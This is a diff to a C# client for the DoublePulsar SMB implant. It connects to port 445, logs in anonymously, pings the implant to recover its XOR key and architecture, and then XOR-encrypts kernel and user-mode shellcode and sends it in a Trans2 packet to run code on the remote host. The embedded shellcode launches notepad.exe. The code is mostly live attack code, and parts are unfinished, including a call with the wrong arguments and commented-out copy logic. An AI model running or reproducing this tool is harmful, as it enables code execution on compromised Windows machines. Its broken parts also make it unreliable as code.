@@ -39,7 +39,7 @@ namespace DoublePulsar
             public ushort UID;
             public ushort MID;
         }
-        
+
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
         public struct SMB_COM_TREE_CONNECT_ANDX_REQUEST
         {
@@ -53,7 +53,7 @@ namespace DoublePulsar
             //SMBData added manually
         }
 
-	    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
         public struct SMB_COM_SESSION_SETUP_ANDX_RESPONSE
         {
             public byte WordCount;
@@ -91,8 +91,8 @@ namespace DoublePulsar
             //Dialects are added manually
         }
 
-	    
-	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
         public struct DOUBLEPULSAR_PING
         {
             public byte WordCount;
@@ -100,23 +100,23 @@ namespace DoublePulsar
             public ushort TotalDataCount;
             public ushort MaxParameterCount;
             public ushort MaxDataCount;
-	    public byte MaxSetupCount;
-	    public byte Reserved;
-	    public ushort Flags;
-	    public uint Timeout;
-	    public ushort Reserved2;
-	    public ushort ParamterCount;
-	    public ushort ParameterOffset;
-	    public ushort DataCount;
-	    public ushort DataOffset;
-	    public byte setupcount;
-	    public byte reserved3;
-	    public ushort subcommand;
+            public byte MaxSetupCount;
+            public byte Reserved;
+            public ushort Flags;
+            public uint Timeout;
+            public ushort Reserved2;
+            public ushort ParameterCount;
+            public ushort ParameterOffset;
+            public ushort DataCount;
+            public ushort DataOffset;
+            public byte setupcount;
+            public byte reserved3;
+            public ushort subcommand;
             public ushort ByteCount;
             public byte padding;
-	    //Parameters added manually
+            //Parameters added manually
         }
-	    
+
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
         public struct SMB_COM_TRANSACTION2_SECONDARY_REQUEST
         {
@@ -125,26 +125,26 @@ namespace DoublePulsar
             public ushort TotalDataCount;
             public ushort MaxParameterCount;
             public ushort MaxDataCount;
-	    public byte MaxSetupCount;
-	    public byte Reserved;
-	    public ushort Flags;
-	    public uint Timeout;
-	    public ushort Reserved2;
-	    public ushort ParamterCount;
-	    public ushort ParameterOffset;
-	    public ushort DataCount;
-	    public ushort DataOffset;
-	    public byte setupcount;
-	    public byte reserved3;
-	    public ushort subcommand;
+            public byte MaxSetupCount;
+            public byte Reserved;
+            public ushort Flags;
+            public uint Timeout;
+            public ushort Reserved2;
+            public ushort ParameterCount;
+            public ushort ParameterOffset;
+            public ushort DataCount;
+            public ushort DataOffset;
+            public byte setupcount;
+            public byte reserved3;
+            public ushort subcommand;
             public ushort ByteCount;
             public byte padding;
-	    //Parameters added manually
+            //Parameters added manually
             //SMBData added manually
         }
-   }
 
-static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] parameters, byte[] encrypted_payload)
+
+        static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] parameters, byte[] encrypted_payload)
         {
             //figure this out here
             NETBIOS_HEADER NTHeader = new NETBIOS_HEADER
@@ -171,42 +171,49 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
             };
             byte[] headerBytes = GetBytes(NTHeader).Concat(GetBytes(header)).ToArray();
 
+
+            //uint doublepulsar_execute_timeout_command = 0x001a8925;
+            //doublepulsar_execute_timeout_command = IPAddress.HostToNetworkOrder(doublepulsar_execute_timeout_command);
+
+            ushort TotalDataCount = (ushort)Marshal.SizeOf(encrypted_payload);
+            ushort ByteCountLocal = (ushort)TotalDataCount;
+            ByteCountLocal += 13;
             SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
             {
-		WordCount = 15,
-		TotalParameterCount = 12,
-		TotalDataCount = 0x1000,
-		MaxParameterCount = 1;
-		MaxDataCount = 0x0000,
-		MaxSetupCount = 0x00;
-		Reserved = 0x00;
-		Flags = 0x00;
-		Timeout = htons(0x001a8925); // [25,89,1a0,00]
-		Reserved = 0x00;
-		ParameterCount = 12,
-		    
-		//where in the packet is the location of the parameters
-		//(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
-		ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
-		DataCount = TotalDataCount,
-		    
-		//where in the packet is the location of the SMBDATA
-		//(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
-		DataOffset = 0x004e; // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
-		SetupCount = 1; //0x01;
-		Reserved = 0x00;
-		subcommand = htons(0x000E);
-		ByteCount = htons(TotalDataCount + 13);
-		Padding = 0x00;
+                WordCount = 15,
+                TotalParameterCount = 12,
+                TotalDataCount = 0x1000,
+                MaxParameterCount = 1,
+                MaxDataCount = 0x0000,
+                MaxSetupCount = 0x00,
+                Reserved = 0x00,
+                Flags = 0x00,
+                Timeout = 0x001a8925, // [25,89,1a0,00] in packet.  0x001a8925
+                Reserved2 = 0x00,
+                ParameterCount = 12,
+
+                //where in the packet is the location of the parameters
+                //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
+                ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
+                DataCount = TotalDataCount,
+
+                //where in the packet is the location of the SMBDATA
+                //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
+                DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
+                setupcount = 1, //0x01;
+                reserved3 = 0x00,
+                subcommand = 0x000E,
+                ByteCount = ByteCountLocal,
+                padding = 0x00
             };
-            
+
             //update timeout to be DoublePulsar EXEC command
-            int timeout = (time * 16) + 3;
-            transaction2SecondaryRequest.DataDisplacement = BitConverter.ToUInt16(new byte[] { 0xd0, BitConverter.GetBytes(timeout)[0] }, 0);
+            //int timeout = (time * 16) + 3;
+            //transaction2SecondaryRequest.DataDisplacement = BitConverter.ToUInt16(new byte[] { 0xd0, BitConverter.GetBytes(timeout)[0] }, 0);
+            
             //Merge SMBHeader with the transaction2SecondaryRequest
             byte[] transaction2SecondaryRequestBytes = GetBytes(transaction2SecondaryRequest);
             byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestBytes).ToArray();
-
 
             List<byte> Parameters = new List<byte>();
             Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
@@ -215,17 +222,16 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
 
             List<byte> SMBData = new List<byte>();
             SMBData.AddRange(Enumerable.Repeat((byte)0x00, 4096));
-            
+
             //copy doublepulsar exec data to SMBData here
             pkt = pkt.Concat(SMBData.ToArray()).ToArray(); //Collect it all
 
-          return pkt;
-      }
-    
-    
-    static public byte[] SMB1AnonymousLogin(Socket sock)
-        {
+            return pkt;
+        }
 
+
+        static public byte[] SMB1AnonymousLogin(Socket sock)
+        {
             SMB_HEADER header = new SMB_HEADER
             {
                 protocol = 0x424d53ff,
@@ -272,8 +278,8 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
             SendSMBMessage(sock, pkt, true);
             return ReceiveSMBMessage(sock);
         }
-    
-    static public byte[] TreeConnectAndXRequest(string target, Socket sock, ushort UID)
+
+        static public byte[] TreeConnectAndXRequest(string target, Socket sock, ushort UID)
         {
             SMB_HEADER header = new SMB_HEADER
             {
@@ -315,10 +321,10 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
             SendSMBMessage(sock, pkt, true);
             return ReceiveSMBMessage(sock);
         }
-	
-	static public byte[] DoublepulsarPingRequest(Socket sock, ushort UID, ushort TID)
-	{
-	    SMB_HEADER header = new SMB_HEADER
+
+        static public byte[] DoublepulsarPingRequest(Socket sock, ushort UID, ushort TID)
+        {
+            SMB_HEADER header = new SMB_HEADER
             {
                 protocol = 0x424d53ff,
                 command = 0x32,
@@ -337,46 +343,47 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
             };
             byte[] headerBytes = GetBytes(header);
 
-	DOUBLEPULSAR_PING ping = new DOUBLEPULSAR_PING
+            DOUBLEPULSAR_PING ping = new DOUBLEPULSAR_PING
             {
-		wordCount = 15, 
-		totalParameterCount = 0x0C,
-		totalDataCount = 0x0000,
+                WordCount = 15,
+                TotalParameterCount = 0x0C,
+                TotalDataCount = 0x0000,
 
-		MaxParameterCount = 0x0100,
-		MaxDataCount = 0x0000,
-		MaxSetupCount = 0x00,
-		reserved1 = 0x00,
-		flags1 = 0x0000,
+                MaxParameterCount = 0x0100,
+                MaxDataCount = 0x0000,
+                MaxSetupCount = 0x00,
+                Reserved = 0x00,
+                Flags = 0x0000,
 
-		//timeout = SWAP_WORD(0x0134ee00),
-		timeout = 0x00ee3401,
+                //timeout = SWAP_WORD(0x0134ee00),
+                Timeout = 0x00ee3401,
 
-		reserved2 = 0x0000
-		ParameterCount = 0x0C
-		ParamOffset= 0x0042
-		DataCount = 0x0000),
-		DataOffset = 0x004e,
-		SetupCount = 1,
-		reserved3 = 0x00,
-		subcommand = 0x000e,
-		ByteCount = 0xD,
-		padding = 0x00,
-		signature = 0x00000000
+                Reserved2 = 0x0000,
+
+                ParameterCount = 0x0C,
+
+                ParameterOffset = 0x0042,
+
+                DataCount = 0x0000,
+                DataOffset = 0x004e,
+                setupcount = 1,
+                reserved3 = 0x00,
+                subcommand = 0x000e,
+                ByteCount = 0xD,
+                padding = 0x00
             };
 
-	List<byte> Parameters = new List<byte>();
-        Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
-	
-	byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
-        byte[] pkt = headerBytes.Concat(DoublepulsarPINGPKT).ToArray();
+            List<byte> Parameters = new List<byte>();
+            Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
 
-	SendSMBMessage(sock, pkt, true);
-        return ReceiveSMBMessage(sock);
-}
-	
+            byte[] DoublepulsarPINGPKT = GetBytes(ping).Concat(Parameters.ToArray()).ToArray();
+            byte[] pkt = headerBytes.Concat(DoublepulsarPINGPKT).ToArray();
 
-static public byte[] MakeKernelShellcode()
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
+        }
+
+        static public byte[] MakeKernelShellcode()
         {
             byte[] shellcode = {
                 0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
@@ -454,7 +461,7 @@ static public byte[] MakeKernelShellcode()
             shellcode = shellcode.Concat(ring3).ToArray();
             return shellcode;
         }
-  
+
         static public SMB_HEADER SMB_HeaderFromBytes(byte[] arr)
         {
             SMB_HEADER str = new SMB_HEADER();
@@ -504,8 +511,8 @@ static public byte[] MakeKernelShellcode()
             SendSMBMessage(sock, pkt, true);
             return ReceiveSMBMessage(sock);
         }
-  
-  
+
+
         static public byte[] SetNetBiosHeader(byte[] pkt)
         {
             uint size = (uint)pkt.Length;
@@ -559,8 +566,9 @@ static public byte[] MakeKernelShellcode()
             Marshal.FreeHGlobal(ptr);
             return arr;
         }
-        
-        UInt32 LE2INT(byte[] data) {
+
+        public static UInt32 LE2INT(byte[] data)
+        {
             UInt32 b;
             b = data[3];
             b <<= 8;
@@ -572,37 +580,52 @@ static public byte[] MakeKernelShellcode()
             return b;
         }
 
-        public byte[] Slice(byte[] data, int index, int length) {
+        public static byte[] Slice(byte[] data, int index, int length)
+        {
             byte[] result = new byte[length];
             Array.Copy(data, index, result, 0, length);
             return result;
         }
-        
-        UInt32 calculate_doublepulsar_xor_key(UInt32 s) {
+
+        public static UInt32 calculate_doublepulsar_xor_key(UInt32 s)
+        {
             UInt32 x;
             x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)));
             x = x & 0xffffffff;  // this line was added just to truncate to 32 bits
             return x;
         }
 
+        // The arch is adjacent to the XOR key in the SMB signature
+        public static string calculate_doublepulsar_arch(UInt64 s)
+        {
+            if ((s & 0xffffffff00000000) == 0)
+            {
+                return "x86 (32-bit)";
+            }
+            else
+            {
+                return "x64 (64-bit)";
+            }
+        }
+
         //https://social.msdn.microsoft.com/Forums/vstudio/en-US/0f63c7f5-02f5-444c-b853-ea779ce005cf/file-encryption-using-multiple-xor-keys?forum=csharpgeneral
-        private static void XorEncrypt(Byte[] message, Byte[] Keys)
+        private static void XorEncrypt(Byte[] message, UInt32[] Keys)
         {
             for (Int32 i = 0; i < message.Length - 1; i++)
             {
-                message[i] ^= Keys[i % Keys.Length];
+                message[i] ^= (byte)Keys[i % 4];
             }
         }
 
         static void Main(string[] args)
         {
-           string target = args[1];
-           string ip = target;
-           int port = 445;
-           TcpClient client = new TcpClient(ip, port);
+            string target = args[1];
+            string ip = target;
+            int port = 445;
+            TcpClient client = new TcpClient(ip, port);
             Socket sock = client.Client;
-          
-             byte[] buf = new byte[279] {
+
+            byte[] buf = new byte[279] {
               0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
               0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
               0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
@@ -623,8 +646,8 @@ static public byte[] MakeKernelShellcode()
               0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
               0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
             byte[] shellcode = MakeKernelUserPayload(buf);
-           
-  
+
+
             Console.WriteLine("Connecting to host with Doublepulsar : " + target);
             ClientNegotiate(sock);
             byte[] response = SMB1AnonymousLogin(sock);
@@ -633,74 +656,82 @@ static public byte[] MakeKernelShellcode()
             header = SMB_HeaderFromBytes(response);
             sock.ReceiveTimeout = 2000;
             Console.WriteLine("Connection established");
-            
+
             //we need to obtain the key for DoublePulsar so send DoublePulsar trans2 ping packet here
             byte[] pingrequestresponse = DoublepulsarPingRequest(sock, header.UID, header.TID);
-		
-	    //Receive Trans2 DoublePulsar Response & Parse
+
+            //Receive Trans2 DoublePulsar Response & Parse
             header = SMB_HeaderFromBytes(pingrequestresponse);
-            
+
             //https://github.com/HynekPetrak/doublepulsar-detection-csharp/blob/master/DoublepulsarDetectionLib/DetectDoublePulsar.cs
             byte[] final_response = pingrequestresponse;
 
-             // Check for 0x51 response to indicate DOUBLEPULSAR infection
-             if (final_response[34] == 0x51) {
-                    byte[] signature = Slice(final_response, 18, 4);
-                    UInt32 signature_long = LE2INT(signature);
-                    UInt32 key = calculate_doublepulsar_xor_key(signature_long);
-                    string arch = calculate_doublepulsar_arch(signature_long);
+            // Check for 0x51 response to indicate DOUBLEPULSAR infection
+            if (final_response[34] == 0x51)
+            {
+                byte[] signature = Slice(final_response, 18, 4);
+                UInt32 signature_long = LE2INT(signature);
+                UInt32 key = calculate_doublepulsar_xor_key(signature_long);
+                string arch = calculate_doublepulsar_arch(signature_long);
 
-                    Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
+                Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
 
-                    //XorEncrypt the payload
-		    XorEncrypt(shellcode, key);
+                //XorEncrypt the payload
+                XorEncrypt(shellcode, key);
 
-                    //Build DoublePulsar payload packet
-                    byte[] doublepulsar_parameters[12];
-                    unit32 size_of_payload = Marshal.SizeOf(shellcode);
-                    unit32 chunk_size = 4096;
-                    unit32 offset = 0x00;
-                    //copy them to doublepulsar_parameters
-		     /*
-		     https://docs.microsoft.com/en-us/dotnet/api/system.buffer.memorycopy?view=net-5.0
-		     https://stackoverflow.com/questions/2996487/memcpy-function-in-c-sharp
-		     https://bytes.com/topic/c-sharp/answers/431682-how-do-memcpy-byte
-		     https://www.abstractpath.com/2009/memcpy-in-c/
-		     
-		     System.Array.Copy(byteA, 0, byteB, 0, 4);
+                //Build DoublePulsar payload packet
+                byte[] doublepulsar_parameters = new byte[12];
+                int size = Marshal.SizeOf(shellcode);
+                int chunk_size = 4096;
+                int offset = 0x00;
+                //copy them to doublepulsar_parameters
+                /*
+                https://docs.microsoft.com/en-us/dotnet/api/system.buffer.memorycopy?view=net-5.0
+                https://stackoverflow.com/questions/2996487/memcpy-function-in-c-sharp
+                https://bytes.com/topic/c-sharp/answers/431682-how-do-memcpy-byte
+                https://www.abstractpath.com/2009/memcpy-in-c/
 
-			Array.Copy()
+                System.Array.Copy(byteA, 0, byteB, 0, 4);
 
-			Buffer.BlockCopy()
-		     
-			MemoryCopy(size_of_payload, doublepulsar_parameters, 4, 4);
-			MemoryCopy(chunk_size, doublepulsar_parameters + 4, 4, 4);
-			MemoryCopy(offset, doublepulsar_parameters + 8, 4, 4);
-			MemoryCopy (void* source, void* destination, ulong destinationSizeInBytes, ulong sourceBytesToCopy);
-			
-		     */
+               Array.Copy()
 
-                    //XorEncrypt the parameters
-		    XorEncrypt(doublepulsar_parameters, key);
+               Buffer.BlockCopy()
 
-                    byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, doublepulsar_parameters, shellcode);
+               MemoryCopy(size_of_payload, doublepulsar_parameters, 4, 4);
+               MemoryCopy(chunk_size, doublepulsar_parameters + 4, 4, 4);
+               MemoryCopy(offset, doublepulsar_parameters + 8, 4, 4);
+               MemoryCopy (void* source, void* destination, ulong destinationSizeInBytes, ulong sourceBytesToCopy);
 
-                    try
-                    {
-                        SendSMBMessage(sock, doublepulsar_exploit_pkt, false);
-                        response = ReceiveSMBMessage(sock);
-                        header = new SMB_HEADER();
-                        header = SMB_HeaderFromBytes(response);
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("Socket error, this might end badly" + e.Message);
-                    }
+
+
+                Marshal.Copy(arr, 0, ptr, size);
+
+                Marshal.Copy(arr, 0, ptr, size);
+
+                Marshal.Copy(arr, 0, ptr, size);
+                */
+
+                //XorEncrypt the parameters
+                XorEncrypt(doublepulsar_parameters, key);
+
+                byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, doublepulsar_parameters, shellcode);
+
+                try
+                {
+                    SendSMBMessage(sock, doublepulsar_exploit_pkt, false);
+                    response = ReceiveSMBMessage(sock);
+                    header = new SMB_HEADER();
+                    header = SMB_HeaderFromBytes(response);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Socket error, this might end badly" + e.Message);
+                }
             }
 
             client.Close();
             sock.Close();
-            
-        }
-}
 
+        }
+    }
+}
